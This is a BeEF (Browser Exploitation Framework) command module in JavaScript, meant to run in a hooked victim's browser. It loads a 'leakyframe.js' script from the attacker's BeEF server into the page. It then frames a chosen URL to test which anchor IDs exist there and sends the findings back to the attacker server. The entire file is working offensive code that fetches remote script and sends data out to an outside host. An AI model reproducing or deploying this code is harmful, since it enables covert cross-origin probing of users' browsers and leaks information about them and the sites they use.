//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

beef.execute(function() {
  var inputURL = '<%= @inputUrl %>';
  var anchorsToCheck = '<%= @anchorsToCheck %>';
  var arrayOfAnchorsToCheck = [];

  //the anchors should be seperated with ','
  //remove tabs, newlines, carriage returns and spaces
  anchorsToCheck = anchorsToCheck.replace(/[ \t\r\n]/g,'');
  arrayOfAnchorsToCheck = anchorsToCheck.split(',');

  var resultList = [];
  var resultString = '';
 
  //check if the leakyframe library is loaded
  //if not add it to the DOM 
  if (typeof LeakyFrame !== 'function'){
    var leakyscript = document.createElement('script');

    leakyscript.setAttribute('type', 'text/javascript');
    leakyscript.setAttribute('src', 'http://'+beef.net.host+':'+beef.net.port+'/leakyframe.js');
    var theparent = document.getElementsByTagName('head')[0];
    theparent.insertBefore(leakyscript, theparent.firstChild);
  }

  var timeout = 100;
  
  //give the DOM some time to load the library
  poll = function(){
    setTimeout(function(){
      timeout--; 
        if (typeof LeakyFrame === 'function') {
          new LeakyFrame(inputURL, 
            function(frame){
              //check each anchor
              for (var anchor = 0; anchor < arrayOfAnchorsToCheck.length; anchor++){
                if (frame.checkID(arrayOfAnchorsToCheck[anchor])){
                  resultList.push('Exists');
                }
                else{
                  resultList.push('Does not exist');
                }
              }
              frame.remove();

              //create the resultstring	
              for (var i = 0; i < resultList.length; i++){
                resultString = resultString + '#' + arrayOfAnchorsToCheck[i] + ' ' + resultList[i] + '; ';
              }

              beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result: ' + resultString);
            },false);
          }
          else if (timeout > 0){
            poll();
          }
          else {
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'time-out occured!');
          }
       }, 100);
    };

  poll();
});

